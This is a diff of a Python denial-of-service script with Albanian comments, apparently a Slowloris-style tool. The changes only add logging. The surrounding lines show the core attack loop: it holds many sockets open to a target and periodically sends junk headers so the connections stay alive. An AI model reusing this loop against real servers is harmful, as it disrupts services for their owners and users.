@@ -118,6 +118,7 @@ def main():
             logging.debug("Krijojme socket nr %s", _)
             s = init_socket(ip)
         except socket.error: #ne rast te connection error
+            logging.info("Krijimi i socket deshtoj. Ndoshta problem me rrjetin.")
             break
         list_of_sockets.append(s)
     while True:
@@ -128,7 +129,7 @@ def main():
                     s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                 except socket.error:
                     list_of_sockets.remove(s) 
-                #nese nje socket nuk funksionon me, e largojme
+                    #nese nje socket nuk funksionon me, per qfaredo arsye, e largojme
 
             for _ in range(socket_count - len(list_of_sockets)):
                 logging.debug("Rikrijim i socketeve...")
@@ -137,12 +138,13 @@ def main():
                     if s:
                         list_of_sockets.append(s)
                 except socket.error:
+                    logging.info("Rikrijim i socket deshtoj. Ndoshta problem me rrjetin.")
                     break
             time.sleep(15)
         
         #handling veprimin ctrl+c te userit
         except (KeyboardInterrupt, SystemExit):
-            print("\nSulmi eshte ndalur.")
+            logging.info("\nSulmi eshte ndalur.")
             break
 
 if __name__ == "__main__":
